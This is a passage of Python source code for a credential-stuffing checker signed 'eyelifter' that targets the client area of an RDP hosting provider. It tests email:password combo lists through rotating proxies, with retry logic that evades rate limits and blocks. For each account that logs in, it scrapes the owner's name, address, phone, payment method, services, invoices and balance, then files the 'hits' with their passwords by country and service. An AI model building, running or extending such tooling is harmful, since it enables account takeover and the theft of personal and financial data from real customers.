                for g in groups[1:]:
                    if g:
                        try:
                            amount = float(g.replace(",", ""))
                            break
                        except ValueError:
                            continue
                if len(groups) >= 3 and groups[2]:
                    currency = groups[2]
            except (ValueError, IndexError, AttributeError, TypeError):
                amount = 0.0
                currency = "USD"

        status = (st.group(1).lower() if st else "").strip()
        status_label = (label.group(1).strip() if label else status.title() or "Unknown")

        due_iso = ""
        due_raw = ""
        due_dt = None
        if due:
            due_iso = due.group(1).strip()
            due_raw = (due.group(2) or "").strip()
            due_dt = _due_to_dt(due_iso) or _due_to_dt(due_raw)

        cycle = (cyc.group(1) if cyc else "").strip()
        days = _days_left(due_dt)
        dl_str = _days_left_str(days)

        is_active = status in ("active",)
        is_suspended = status in ("suspended",)
        is_dead = status in ("terminated", "cancelled")
        is_pending = status in ("pending",)
        overdue = bool(days is not None and days < 0 and is_active)
        expiring_soon = bool(days is not None and 0 <= days <= 7 and is_active)

        out.append({
            "id": sid.group(1) if sid else "",
            "tooltip": tip.group(1) if tip else "",
            "name": nm.group(1).strip() if nm else "",
            "sort_order": order.group(1) if order else "",
            "amount": amount,
            "currency": currency,
            "status": status,
            "status_label": status_label,
            "cycle": cycle,
            "next_due_iso": due_iso,
            "next_due_raw": due_raw,
            "next_due_dt": due_dt.isoformat() if due_dt else "",
            "days_left": days,
            "days_left_str": dl_str,
            "is_active": is_active,
            "is_suspended": is_suspended,
            "is_dead": is_dead,
            "is_pending": is_pending,
            "overdue": overdue,
            "expiring_soon": expiring_soon,
        })
    return out


def eyelifter_parse_invoices(html):
    out = []
    for row_m in _INVOICE_TR_RE.finditer(html):
        row = row_m.group(1)
        low = row.lower()
        if "viewinvoice" not in low and "status-" not in low:
            continue
        inv = _INVOICE_LINK_RE.search(row)
        amt = _INVOICE_AMOUNT_RE.search(row)
        st = _INVOICE_STATUS_RE.search(row)
        if not inv and not st:
            continue
        try:
            amount = float(amt.group(1).replace(",", "")) if amt else 0.0
        except ValueError:
            amount = 0.0
        due = _SERVICE_DUE_RE.search(row)
        due_dt = None
        if due:
            due_dt = _due_to_dt(due.group(1)) or _due_to_dt(due.group(2))
        days = _days_left(due_dt)
        out.append({
            "id": inv.group(1).strip().lstrip("#") if inv else "",
            "amount": amount,
            "currency": (amt.group(2) if amt and amt.group(2) else "USD"),
            "status": st.group(1).lower() if st else "",
            "next_due_iso": due_dt.isoformat() if due_dt else "",
            "days_left": days,
            "days_left_str": _days_left_str(days),
        })
    return out


def eyelifter_parse_balance(html):
    m = _BAL_RE.search(html)
    if m:
        try:
            return float(m.group(1).replace(",", ""))
        except ValueError:
            pass
    return 0.0


def eyelifter_parse_profile(html):
    p = _parse_form(html)
    data = {}
    for k in ("firstname", "lastname", "companyname", "email",
              "address1", "address2", "city", "state", "postcode",
              "phonenumber"):
        v = _input_val(p.inputs, k)
        if v:
            data[k] = v.strip()
    c = p.selects.get("country")
    if c and c.get("selected"):
        data["country"] = c["selected"].upper()
        for o in c["options"]:
            if o["selected"]:
                data["country_name"] = o["text"].strip()
                break
    pm = p.selects.get("paymentmethod")
    if pm and pm.get("selected"):
        data["paymentmethod"] = pm["selected"]
        for o in pm["options"]:
            if o["selected"]:
                data["paymentmethod_name"] = o["text"].strip()
                break
    cf = p.selects.get("customfield[5]")
    if cf and cf.get("selected"):
        for o in cf["options"]:
            if o["selected"]:
                data["custom_source"] = o["text"].strip()
                break
    first = data.get("firstname", "")
    last = data.get("lastname", "")
    if first or last:
        data["full_name"] = f"{first} {last}".strip()
    return data


def eyelifter_parse_country_fallback(html):
    m = _COUNTRY_SELECTED_RE.search(html)
    if m:
        return m.group(1).upper()
    return None


def eyelifter_fetch_service_detail(session, sid, timeout=25):
    if not sid:
        return {}
    url = f"{BASE}/rdp/clientarea.php?action=productdetails&id={sid}"
    try:
        r = session.get(url, timeout=timeout)
    except Exception:
        return {}
    if r.status_code != 200:
        return {}
    html = r.text
    out = {}

    def _rx(pattern, flags=re.I):
        m = re.search(pattern, html, flags)
        return m.group(1).strip() if m else None

    reg_raw = _rx(
        r'id="registrationDate"[^>]*>.*?<div[^>]*>\s*Registration Date\s*</div>\s*'
        r'<div[^>]*>\s*([^<]+?)\s*</div>')
    if not reg_raw:
        reg_raw = _rx(
            r'Registration Date\s*</div>\s*<div[^>]*>\s*([^<]+?)\s*</div>')
    if reg_raw:
        out["reg_date_raw"] = reg_raw
        reg_dt = _due_to_dt(reg_raw)
        if reg_dt:
            out["reg_date_iso"] = reg_dt.isoformat()

    due_raw = _rx(
        r'id="nextDueDate"[^>]*>.*?<div[^>]*>\s*Next Due Date\s*</div>\s*'
        r'<div[^>]*>\s*([^<]+?)\s*</div>')
    if not due_raw:
        due_raw = _rx(
            r'Next Due Date\s*</div>\s*<div[^>]*>\s*([^<]+?)\s*</div>')
    if due_raw and due_raw != "-":
        out["next_due_raw"] = due_raw
        due_dt = _due_to_dt(due_raw)
        if due_dt:
            out["next_due_iso"] = due_dt.isoformat()

    cycle = _rx(r'Billing Cycle\s*</div>\s*<div[^>]*>\s*([^<]+?)\s*</div>')
    if cycle:
        out["billing_cycle"] = cycle

    recur = _rx(r'Recurring Amount\s*</div>\s*<div[^>]*>\s*\$?\s*([\d.,]+)')
    if recur:
        try:
            out["recurring_amount"] = float(recur.replace(",", ""))
        except ValueError:
            pass

    pm = _rx(r'Payment Method\s*</div>\s*<div[^>]*>\s*([^<]+?)\s*</div>')
    if pm:
        out["payment_method"] = pm

    host = _rx(r'Enter Hostname\s*</strong>\s*</div>\s*<div[^>]*>\s*([^<]+?)\s*</div>')
    if host:
        out["hostname"] = host

    return out


def eyelifter_quote(s):
    return urllib.parse.quote(str(s), safe="")


def eyelifter_rdp_login(s, identifier, password):
    to = _loader.settings["timeout"]

    eyelifter_rl_wait()
    if _STOP.is_set():
        return "error", {"type": "stopped"}

    try:
        r1 = s.get(LOGIN_URL, timeout=to)
    except Exception as e:
        return "error", {"type": f"warm_net_{type(e).__name__}"}

    eyelifter_debug_dump("login_page", r1, identifier)

    if r1.status_code == 429:
        return "error", {"type": "rate_limit"}
    if r1.status_code == 403:
        return "error", {"type": "warm_403"}
    if r1.status_code != 200:
        return "error", {"type": f"warm_{r1.status_code}"}

    token = eyelifter_extract_token(r1.text)
    if not token:
        return "error", {"type": "no_token"}

    body = (f"token={token}"
            f"&username={eyelifter_quote(identifier)}"
            f"&password={eyelifter_quote(password)}"
            f"&rememberme=on")

    try:
        r2 = s.post(
            LOGIN_URL, data=body, allow_redirects=False, timeout=to,
            headers={
                "content-type": "application/x-www-form-urlencoded",
                "origin": BASE,
                "referer": LOGIN_URL,
                "sec-fetch-dest": "document",
                "sec-fetch-mode": "navigate",
                "sec-fetch-site": "same-origin",
                "sec-fetch-user": "?1",
            },
        )
    except Exception as e:
        return "error", {"type": f"login_net_{type(e).__name__}"}

    eyelifter_debug_dump("login_post", r2, identifier)

    if r2.status_code == 429:
        return "error", {"type": "rate_limit"}
    if r2.status_code == 403:
        return "error", {"type": "auth_403"}

    if r2.status_code == 200:
        if _FAIL_RE.search(r2.text):
            return "bad", {"reason": "invalid_credentials"}
        if "token" in r2.text.lower() and "password" in r2.text.lower() \
                and "welcome" not in r2.text.lower():
            return "bad", {"reason": "invalid_credentials"}
        return "error", {"type": f"login_http_{r2.status_code}"}

    if r2.status_code not in (301, 302, 303, 307, 308):
        return "error", {"type": f"login_http_{r2.status_code}"}

    loc = r2.headers.get("location", "")
    if not loc:
        return "error", {"type": "no_location"}
    if "login" in loc.lower():
        return "bad", {"reason": "invalid_credentials"}

    next_url = loc if loc.startswith("http") else BASE + "/rdp/" + loc.lstrip("/")

    try:
        r3 = s.get(next_url, timeout=to)
    except Exception as e:
        return "error", {"type": f"follow_net_{type(e).__name__}"}

    eyelifter_debug_dump("follow", r3, identifier)

    if r3.status_code != 200:
        return "error", {"type": f"follow_http_{r3.status_code}"}

    if "login" in r3.url.lower() and "logout" not in r3.url.lower():
        return "bad", {"reason": "invalid_credentials"}

    lower3 = r3.text.lower()
    if any(m in lower3 for m in _CF_MARKERS):
        return "error", {"type": "cf_block"}
    if "logout" not in lower3:
        return "error", {"type": "cf_block"}

    services = []
    invoices = []
    balance = 0.0
    profile = {}
    area_html = ""

    try:
        r = s.get(SERVICES_URL, timeout=to)
        eyelifter_debug_dump("services", r, identifier)
        if r.status_code == 200:
            services = eyelifter_parse_services(r.text)
    except Exception:
        services = []

    for svc in services:
        if not svc.get("is_active"):
            continue
        if svc.get("next_due_iso") and svc.get("next_due_iso") != "0000-00-00":
            continue
        detail = eyelifter_fetch_service_detail(s, svc.get("id"), timeout=to)
        if not detail:
            continue
        if detail.get("reg_date_iso"):
            svc["reg_date_iso"] = detail["reg_date_iso"]
            svc["reg_date_raw"] = detail.get("reg_date_raw", "")
        if detail.get("next_due_iso"):
            svc["next_due_iso"] = detail["next_due_iso"]
            svc["next_due_dt"] = detail["next_due_iso"]
            nd = _due_to_dt(detail["next_due_iso"])
            if nd:
                svc["days_left"] = _days_left(nd)
                svc["days_left_str"] = _days_left_str(svc["days_left"])
                if svc["days_left"] is not None and svc["days_left"] < 0:
                    svc["overdue"] = True
                if svc["days_left"] is not None and 0 <= svc["days_left"] <= 7:
                    svc["expiring_soon"] = True
        if detail.get("billing_cycle"):
            svc["cycle"] = detail["billing_cycle"]
        if detail.get("recurring_amount") is not None:
            svc["recurring_amount"] = detail["recurring_amount"]
        if detail.get("payment_method"):
            svc["payment_method"] = detail["payment_method"]
        if detail.get("hostname"):
            svc["hostname"] = detail["hostname"]

    try:
        r = s.get(INVOICES_URL, timeout=to)
        eyelifter_debug_dump("invoices", r, identifier)
        if r.status_code == 200:
            invoices = eyelifter_parse_invoices(r.text)
    except Exception:
        invoices = []

    try:
        r = s.get(ADD_FUNDS_URL, timeout=to)
        eyelifter_debug_dump("addfunds", r, identifier)
        if r.status_code == 200:
            balance = eyelifter_parse_balance(r.text)
    except Exception:
        balance = 0.0

    try:
        r = s.get(DETAILS_URL, timeout=to)
        eyelifter_debug_dump("details", r, identifier)
        if r.status_code == 200:
            profile = eyelifter_parse_profile(r.text)
            area_html = r.text
    except Exception:
        profile = {}
        area_html = ""

    country = profile.get("country")
    if not country and area_html:
        country = eyelifter_parse_country_fallback(area_html)

    return "ok", {
        "identifier": identifier,
        "password": password,
        "username": profile.get("full_name", ""),
        "firstname": profile.get("firstname", ""),
        "lastname": profile.get("lastname", ""),
        "confirmed_email": profile.get("email", ""),
        "country": country,
        "country_name": profile.get("country_name", ""),
        "companyname": profile.get("companyname", ""),
        "address1": profile.get("address1", ""),
        "address2": profile.get("address2", ""),
        "city": profile.get("city", ""),
        "state": profile.get("state", ""),
        "postcode": profile.get("postcode", ""),
        "phonenumber": profile.get("phonenumber", ""),
        "paymentmethod": profile.get("paymentmethod_name", ""),
        "custom_source": profile.get("custom_source", ""),
        "services": services,
        "invoices": invoices,
        "balance": balance,
    }


def eyelifter_classify(result):
    services = result.get("services") or []
    invoices = result.get("invoices") or []
    balance = float(result.get("balance") or 0)
    min_price = float(_loader.settings.get("min_price_for_hit", 0.01))

    live_services = [s for s in services if s.get("is_active")]
    suspended_services = [s for s in services if s.get("is_suspended")]
    dead_services = [s for s in services if s.get("is_dead")]
    pending_services = [s for s in services if s.get("is_pending")]
    overdue_services = [s for s in live_services if s.get("overdue")]
    expiring_soon = [s for s in live_services if s.get("expiring_soon")]

    paid_live = [
        s for s in live_services
        if s.get("amount", 0) >= min_price
        and not _is_free_cycle(s.get("cycle", ""))
    ]
    free_live = [
        s for s in live_services
        if s not in paid_live
    ]

    paid_invoices = [
        i for i in invoices
        if i["amount"] >= min_price
        and i["status"] not in ("cancelled", "refunded")
    ]
    total_active = sum(s["amount"] for s in paid_live)
    total_overdue = sum(s["amount"] for s in suspended_services)

    reg_dates = []
    for s in live_services:
        iso = s.get("reg_date_iso")
        if iso:
            dt = _due_to_dt(iso)
            if dt:
                reg_dates.append(dt)
    earliest_reg = min(reg_dates).strftime("%Y-%m-%d") if reg_dates else None

    enr = {
        "identifier": result.get("identifier") or "",
        "password": result.get("password", ""),
        "username": result.get("username", ""),
        "firstname": result.get("firstname", ""),
        "lastname": result.get("lastname", ""),
        "confirmed_email": result.get("confirmed_email") or "",
        "country": (result.get("country") or "").upper(),
        "country_name": result.get("country_name", ""),
        "companyname": result.get("companyname", ""),
        "address1": result.get("address1", ""),
        "address2": result.get("address2", ""),
        "city": result.get("city", ""),
        "state": result.get("state", ""),
        "postcode": result.get("postcode", ""),
        "phonenumber": result.get("phonenumber", ""),
        "paymentmethod": result.get("paymentmethod", ""),
        "custom_source": result.get("custom_source", ""),
        "services": services,
        "invoices": invoices,
        "balance": balance,
        "service_count": len(services),
        "invoice_count": len(invoices),
        "live_services": live_services,
        "active_services": live_services,
        "paid_live": paid_live,
        "free_live": free_live,
        "suspended_services": suspended_services,
        "dead_services": dead_services,
        "pending_services": pending_services,
        "overdue_services": overdue_services,
        "expiring_soon": expiring_soon,
        "paid_invoices": paid_invoices,
        "total_active_amount": total_active,
        "total_overdue_amount": total_overdue,
        "earliest_reg_date": earliest_reg,
    }

    if paid_live or paid_invoices or balance > 0:
        reasons = []
        if paid_live:
            reasons.append(f"{len(paid_live)} paid live")
        if overdue_services:
            reasons.append(f"{len(overdue_services)} overdue")
        if paid_invoices:
            reasons.append(f"{len(paid_invoices)} paid inv")
        if balance > 0:
            reasons.append(f"bal=${balance:.2f}")
        enr["hit_reason"] = ", ".join(reasons)
        return "hit", enr

    if free_live:
        enr["hit_reason"] = f"{len(free_live)} free/active"
        return "free", enr

    if suspended_services:
        enr["hit_reason"] = f"{len(suspended_services)} suspended"
        return "free", enr

    if services:
        enr["hit_reason"] = "dead/pending only"
        return "free", enr

    enr["hit_reason"] = "no services"
    return "none", enr


def _earliest_due(services):
    best = None
    for s in services:
        d = s.get("days_left")
        if d is None:
            continue
        if best is None or d < best:
            best = d
    return best


def _svc_token(s):
    nm = s.get("name") or "?"
    iso = s.get("next_due_iso") or ""
    raw = s.get("next_due_raw") or ""
    dl = s.get("days_left")
    exp = iso or raw or ""
    if exp and exp != "0000-00-00" and not exp.startswith("0000-00-00"):
        exp_s = exp[:10]
    else:
        exp_s = "-"
    dl_s = _days_left_str(dl) if dl is not None else "-"
    return f"{nm}|{exp_s}|{dl_s}"


def eyelifter_fmt_line(combo, u, status, for_file=False):
    tag = {"hit": "HIT", "free": "FREE", "none": "NONE",
           "bad": "BAD", "error": "ERR"}.get(status, "?")

    live = u.get("live_services") or []
    sus = u.get("suspended_services") or []
    dead = u.get("dead_services") or []
    pend = u.get("pending_services") or []
    paid_live = u.get("paid_live") or []

    name = u.get("username") or "-"
    country = u.get("country") or "-"
    email = u.get("confirmed_email") or "-"

    if live:
        live_tokens = ",".join(_svc_token(s) for s in live[:5])
        live_field = f"{len(live)}({live_tokens})"
    else:
        live_field = "0(-)"

    earliest_dt = None
    for s in live:
        d = s.get("days_left")
        if d is None:
            continue
        if earliest_dt is None or d < earliest_dt:
            earliest_dt = d
    earliest_str = _days_left_str(earliest_dt) if earliest_dt is not None else "-"

    earliest_iso = ""
    for s in sorted(live, key=lambda x: x.get("days_left") if x.get("days_left") is not None else 10**9):
        iso = s.get("next_due_iso") or s.get("next_due_raw") or ""
        if iso and iso != "0000-00-00" and not iso.startswith("0000-00-00"):
            earliest_iso = iso[:10]
            break

    live_amt = float(u.get("total_active_amount") or 0)
    over_amt = float(u.get("total_overdue_amount") or 0)
    bal = float(u.get("balance") or 0)
    reason = u.get("hit_reason") or "-"

    parts = [
        f"Name={name}",
        f"Country={country}",
        f"Email={email}",
        f"Live={live_field}",
        f"Paid={len(paid_live)}",
        f"Suspended={len(sus)}",
        f"Pending={len(pend)}",
        f"Dead={len(dead)}",
        f"RegDate={u.get('earliest_reg_date') or '-'}",
        f"EarliestExp={earliest_iso or '-'} ({earliest_str})",
        f"LiveAmt=${live_amt:.2f}",
        f"OverdueAmt=${over_amt:.2f}",
        f"Bal=${bal:.2f}",
        f"Reason={reason}",
    ]
    if for_file:
        parts.append(LINE_TAG)
    return f"{tag} {combo} | " + " | ".join(parts)


def eyelifter_check_combo(combo, proxy):
    eyelifter_rl_wait()
    if _STOP.is_set():
        return {"status": "error", "identifier": combo.split(":", 1)[0],
                "password": "", "error_type": "stopped"}

    identifier, password = combo.split(":", 1)
    identifier = identifier.strip()
    password = password.strip()

    s = eyelifter_build(proxy)
    try:
        st, pl = eyelifter_rdp_login(s, identifier, password)

        if st == "bad":
            return {"status": "bad", "identifier": identifier,
                    "password": password,
                    "reason": pl.get("reason", "invalid")}
        if st == "error":
            return {"status": "error", "identifier": identifier,
                    "password": password,
                    "error_type": pl.get("type", "unknown"),
                    "msg": pl.get("msg", "")}

        return {"status": "ok",
                "identifier": identifier,
                "password": password,
                "username": pl.get("username", ""),
                "firstname": pl.get("firstname", ""),
                "lastname": pl.get("lastname", ""),
                "confirmed_email": pl.get("confirmed_email"),
                "country": pl.get("country"),
                "country_name": pl.get("country_name"),
                "companyname": pl.get("companyname"),
                "address1": pl.get("address1"),
                "address2": pl.get("address2"),
                "city": pl.get("city"),
                "state": pl.get("state"),
                "postcode": pl.get("postcode"),
                "phonenumber": pl.get("phonenumber"),
                "paymentmethod": pl.get("paymentmethod"),
                "custom_source": pl.get("custom_source"),
                "services": pl.get("services", []),
                "invoices": pl.get("invoices", []),
                "balance": pl.get("balance", 0.0)}
    finally:
        try:
            s.close()
        except Exception:
            pass


def eyelifter_run_retry(combo, proxy):
    at = _loader.settings.get("retries", 1) + 1
    lp = proxy
    result = None

    try:
        for a in range(at):
            if _STOP.is_set():
                break
            if a > 0:
                np = eyelifter_pick_proxy(exclude=lp)
                if np:
                    if lp and lp != np:
                        eyelifter_rel_proxy(lp)
                    proxy = np
                eyelifter_log("🔁", "STEP", "RETRY",
                    f"attempt {a+1}/{at} · rotating fp · "
                    f"{combo.split(':', 1)[0][:40]} [eyelifter]")
            lp = proxy

            try:
                result = eyelifter_check_combo(combo, proxy)
            except Exception as e:
                result = {"status": "error",
                          "identifier": combo.split(":", 1)[0],
                          "password": combo.split(":", 1)[1] if ":" in combo else "",
                          "error_type": "crash", "msg": str(e)[:120]}

            if result.get("status") in ("ok", "bad"):
                break

            et = result.get("error_type", "")
            is_last = a == at - 1

            if et == "rate_limit":
                with _LK:
                    _ST["rl"] += 1
                if proxy:
                    eyelifter_cool_proxy(proxy, 120.0)
                rotate_fp()
                w = min(_loader.settings.get("rate_limit_delay", 12) * (2 ** a), 120)
                eyelifter_rl_backoff(w)
                if _STOP.wait(w * (0.7 + random.random() * 0.6)):
                    break
                continue

            if et in ("warm_403", "auth_403", "login_403", "cf_block"):
                if proxy:
                    eyelifter_bad_proxy(proxy)
                rotate_fp()
                if not is_last and _STOP.wait(_loader.settings.get("retry_delay", 1.5)):
                    break
                continue

            if et.startswith(("warm_net_", "login_net_", "follow_net_")):
                if proxy is None:
                    break
                eyelifter_bad_proxy(proxy)
                if not is_last and _STOP.wait(_loader.settings.get("retry_delay", 1.5)):
                    break
                continue

            if et in ("no_token", "no_location", "no_code"):
                with _LK:
                    _ST["temp"] += 1
                rotate_fp()
                if proxy:
                    eyelifter_cool_proxy(proxy, 20.0)
                backoff = min(2.0 * (2 ** a), 30.0)
                jitter = backoff * (0.5 + random.random() * 0.6)
                if not is_last and _STOP.wait(jitter):
                    break
                continue

            if not is_last and _STOP.wait(_loader.settings.get("retry_delay", 1.5)):
                break
    finally:
        if lp:
            eyelifter_rel_proxy(lp)

    return result or {"status": "error",
                      "identifier": combo.split(":", 1)[0],
                      "password": "", "error_type": "no_result"}


def eyelifter_safe_svc_filename(name):
    s = re.sub(r'[^A-Za-z0-9._@\- ]', '_', str(name)).strip()
    s = s[:120] or "svc"
    return s


def eyelifter_record(combo, result):
    global _HIT_F, _FREE_F, _NONE_F, _BAD_F, _ERR_F
    global _SVCSETS, _CTRY_SETS

    st = result.get("status", "error")
    if st == "ok":
        verdict, enr = eyelifter_classify(result)
    else:
        verdict = st
        enr = None

    with _LK:
        _ST["checked"] += 1
        done = _ST["checked"]
        if verdict == "hit":
            _ST["hit"] += 1
        elif verdict == "free":
            _ST["free"] += 1
        elif verdict == "none":
            _ST["none"] += 1
        elif verdict == "bad":
            _ST["bad"] += 1
        else:
            _ST["errors"] += 1
        total = _TOTAL

    identifier = result.get("identifier", "")
    password = result.get("password", "")
    cc = f"{identifier}:{password}"

    if verdict in ("hit", "free", "none"):
        country = (enr.get("country") or "").upper()
        ctag = country if country else "??"
        line_term = eyelifter_fmt_line(cc, enr, verdict, for_file=False)
        line_file = eyelifter_fmt_line(cc, enr, verdict, for_file=True)

        if verdict == "hit":
            with _LK:
                for s in enr["paid_live"]:
                    nm = s["name"]
                    if nm not in _SVCSETS:
                        _SVCSETS[nm] = set()
                    _SVCSETS[nm].add(identifier)
                if country:
                    if country not in _CTRY_SETS:
                        _CTRY_SETS[country] = set()
                    _CTRY_SETS[country].add(identifier)

            eyelifter_rline(done, total, "HIT", line_term, "32", True)
            eyelifter_sw(_HIT_F, line_file + "\n\n")

            if country:
                cpath = os.path.join(_FOLDER, "Countries", f"{country}.txt")
                with _FK:
                    try:
                        os.makedirs(os.path.dirname(cpath), exist_ok=True)
                        if not os.path.exists(cpath):
                            try:
                                with open(cpath, "x", encoding="utf-8") as h:
                                    h.write(f"# RDPHostings Checker by eyelifter - "
                                            f"{datetime.now().isoformat()}\n"
                                            f"# Credit: eyelifter | {TG_USER} | {TG_CHAN}\n"
                                            f"# Country: {country}\n\n")
                            except FileExistsError:
                                pass
                        with open(cpath, "a", encoding="utf-8") as f:
                            f.write(f"{cc} | {LINE_TAG}\n\n")
                    except Exception:
                        pass

            for s in enr["paid_live"]:
                safe = eyelifter_safe_svc_filename(s["name"])
                sp = os.path.join(_FOLDER, "Services", f"{safe}.txt")
                with _FK:
                    try:
                        if not os.path.exists(sp):
                            try:
                                with open(sp, "x", encoding="utf-8") as h:
                                    h.write(f"# RDPHostings Checker by eyelifter - "
                                            f"{datetime.now().isoformat()}\n"
                                            f"# Credit: eyelifter | {TG_USER} | {TG_CHAN}\n"
                                            f"# Service: {s['name']}\n\n")
                            except FileExistsError:
                                pass
                        with open(sp, "a", encoding="utf-8") as f:
                            f.write(f"{cc} | {ctag} | ${s['amount']:.2f} "
                                    f"{s['currency']} | due={s.get('next_due_iso') or '-'} "
                                    f"({s.get('days_left_str') or '-'}) | "
                                    f"reg={s.get('reg_date_iso') or '-'} | "
                                    f"{LINE_TAG}\n\n")
                    except Exception:
                        pass

        elif verdict == "free":
            eyelifter_rline(done, total, "FREE", line_term, "36")
            eyelifter_sw(_FREE_F, line_file + "\n\n")

        else:
            eyelifter_rline(done, total, "NONE", line_term, "33")
            eyelifter_sw(_NONE_F, line_file + "\n\n")

    elif verdict == "bad":
        eyelifter_rline(done, total, "BAD",
            f"BAD {cc} | {result.get('reason', 'invalid')}", "31")
        eyelifter_sw(_BAD_F,
            f"BAD {cc} | {result.get('reason', 'invalid')} | {LINE_TAG}\n\n")

    else:
        et = result.get("error_type", "")
        msg = result.get("msg", "")
        eyelifter_rline(done, total, "ERR", f"ERR {cc} | [{et}] {msg}", "33")
        eyelifter_sw(_ERR_F, f"ERR {cc} | [{et}] {msg} | {LINE_TAG}\n\n")


check_combo = eyelifter_check_combo
run_retry = eyelifter_run_retry
record = eyelifter_record


class EyelifterRunner:
    def __init__(self, combos):
        self.eyelifter = "eyelifter"
        self.combos = combos
        self.threads = _loader.settings["threads"]
        self.gap = _loader.settings.get("combo_delay", 0.4)
        self.chunk = max(self.threads * 2, 100)

    def eyelifter_task(self, combo):
        if _STOP.is_set():
            return
        if self.gap > 0:
            if _STOP.wait(self.gap * (0.5 + random.random())):
                return
        if _STOP.is_set():
            return
        proxy = eyelifter_pick_proxy()
        try:
            result = eyelifter_run_retry(combo, proxy)
        except Exception as e:
            result = {"status": "error",
                      "identifier": combo.split(":", 1)[0],
                      "password": combo.split(":", 1)[1] if ":" in combo else "",
                      "error_type": "runner_crash", "msg": str(e)[:120]}
        try:
            eyelifter_record(combo, result)
        except Exception:
            pass

    def eyelifter_run(self):
        inflight = set()
        ex = ThreadPoolExecutor(max_workers=self.threads)
        try:
            for i in range(0, len(self.combos), self.chunk):
                if _STOP.is_set():
                    break
                batch = self.combos[i:i + self.chunk]
                for c in batch:
                    if _STOP.is_set():
                        break
                    inflight.add(ex.submit(self.eyelifter_task, c))

                while inflight:
                    done, pending = wait(inflight, timeout=0.5,
                                         return_when=FIRST_COMPLETED)
                    for f in done:
                        inflight.discard(f)
                        try:
                            f.result(timeout=0.1)
                        except Exception:
                            pass
                    if _STOP.is_set() and not done:
                        break

            while inflight:
                done, pending = wait(inflight, timeout=0.5,
                                     return_when=FIRST_COMPLETED)
                for f in done:
                    inflight.discard(f)
                    try:
                        f.result(timeout=0.1)
                    except Exception:
                        pass
        except KeyboardInterrupt:
            _STOP.set()
        finally:
            _STOP.set()
            try:
                ex.shutdown(wait=True, cancel_futures=True)
            except TypeError:
                ex.shutdown(wait=True)


def bulk_runner(combos):
    EyelifterRunner(combos).eyelifter_run()


def eyelifter_open_files(folder):
    os.makedirs(os.path.join(folder, "Services"), exist_ok=True)
    os.makedirs(os.path.join(folder, "Countries"), exist_ok=True)
    names = ["rdp_hits.txt", "rdp_free.txt", "rdp_none.txt",
             "rdp_bad.txt", "rdp_errors.txt"]
    op = []
    try:
        for n in names:
            op.append(open(os.path.join(folder, n), "w", encoding="utf-8"))
    except Exception:
        for h in op:
            try:
                h.close()
            except Exception:
                pass
        raise
    return op


open_files = eyelifter_open_files


def eyelifter_extract_combos(content):
    out = set()
    skipped = 0
    for raw in content.splitlines():
        line = raw.strip()
        if not line or line.startswith("#"):
            continue
        m = _COMBORX.match(line)
        if m:
            ident = m.group(1).strip().lower()
            pwd = m.group(2).strip()
            if ident and pwd:
                out.add(f"{ident}:{pwd}")
        else:
            skipped += 1
    if skipped:
        eyelifter_log("🧹", "INFO", "EXTRACT",
            f"{skipped} lines skipped (not email:password) [eyelifter]")
    return sorted(out)


extract_combos = eyelifter_extract_combos


def eyelifter_ask_threads():
    print()
    print(eyelifter_color("96", "  Threads [eyelifter]  (1-200)"))
    raw = input(eyelifter_color("96", "  > ")).strip()
    if not raw:
        return _loader.settings["threads"]
    try:
        t = int(raw)
    except ValueError:
        return _loader.settings["threads"]
    return max(1, min(MAX_THREADS, t))


def eyelifter_single_check(proxies):
    global _POOL, _BADP, _FOLDER
    _STOP.clear()

    eyelifter_section("SINGLE CHECK [eyelifter]")
    combo = input(f"{eyelifter_color('96', '[*] email:password > ')}").strip()
    if ":" not in combo:
        eyelifter_log("❌", "ERROR", "INPUT", "invalid format [eyelifter]")
        if sys.stdin.isatty():
            input(f"{eyelifter_color('93', '[*] Enter to continue...')}")
        return

    if not re.match(r'^[^:\s|]+@[^:\s|]+\.[a-zA-Z]{2,}:', combo):
        eyelifter_log("❌", "ERROR", "INPUT", "email:password only [eyelifter]")
        if sys.stdin.isatty():
            input(f"{eyelifter_color('93', '[*] Enter to continue...')}")
        return

    if not _FOLDER:
        root = os.path.join(os.path.dirname(CFG_PATH), RESULTS)
        os.makedirs(root, exist_ok=True)
        ts = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        tag = "".join(random.choices(string.ascii_lowercase + string.digits, k=4))
        _FOLDER = os.path.join(root, f"Single_{ts}_{tag}")
        os.makedirs(_FOLDER, exist_ok=True)

    proxy = None
    if proxies:
        if not _POOL:
            _POOL = list(proxies)
            _BADP = set()
        proxy = eyelifter_pick_proxy()

    eyelifter_log("🔍", "STEP", "CHECK", f"checking {combo.split(':')[0]} [eyelifter]")
    start = time.time()
    result = eyelifter_run_retry(combo, proxy)
    el = time.time() - start

    st = result.get("status")
    if st == "ok":
        verdict, enr = eyelifter_classify(result)
        vlabel = {"hit": "💰 HIT (paid service)",
                  "free": "🆓 FREE (no paid service)",
                  "none": "⚪ NONE (no services)"}.get(verdict, "?")
        live = enr.get("live_services") or []
        sus = enr.get("suspended_services") or []
        dead = enr.get("dead_services") or []
        pend = enr.get("pending_services") or []
        paid = enr.get("paid_live") or []
        dl = _earliest_due(paid) if paid else (_earliest_due(live) if live else None)
        rows = [
            ("Status", vlabel),
            ("Email", enr["identifier"]),
            ("Password", enr["password"]),
            ("Full Name", enr["username"] or "-"),
            ("Confirmed Email", enr["confirmed_email"] or "-"),
            ("Country", f"{enr['country'] or '?'} ({enr['country_name'] or '?'})"),
            ("Company", enr["companyname"] or "-"),
            ("Phone", enr["phonenumber"] or "-"),
            ("Reg Date", enr.get("earliest_reg_date") or "-"),
            ("Live", str(len(live))),
            ("Paid Live", str(len(paid))),
            ("Suspended", str(len(sus))),
            ("Pending", str(len(pend))),
            ("Dead", str(len(dead))),
            ("Soonest Due", _days_left_str(dl)),
            ("Live Total", f"${enr.get('total_active_amount', 0):.2f}"),
            ("Overdue Total", f"${enr.get('total_overdue_amount', 0):.2f}"),
            ("Invoices", str(enr["invoice_count"])),
            ("Balance", f"${enr['balance']:.2f}"),
            ("Reason", enr.get("hit_reason", "-")),
            ("Time", f"{el:.2f}s"),
            ("Credit", f"eyelifter · {TG_USER} · {TG_CHAN}"),
        ]
        eyelifter_summary(rows)
        if enr["services"]:
            print(eyelifter_color("96", "── services [eyelifter] ──", True))
            for s in enr["services"]:
                if s.get("is_active") and s.get("overdue"):
                    marker = "◐"
                elif s.get("is_active") and s.get("amount", 0) > 0:
                    marker = "$"
                elif s.get("is_active"):
                    marker = "●"
                elif s.get("is_suspended"):
                    marker = "◐"
                elif s.get("is_dead"):
                    marker = "○"
                elif s.get("is_pending"):
                    marker = "◌"
                else:
                    marker = "·"
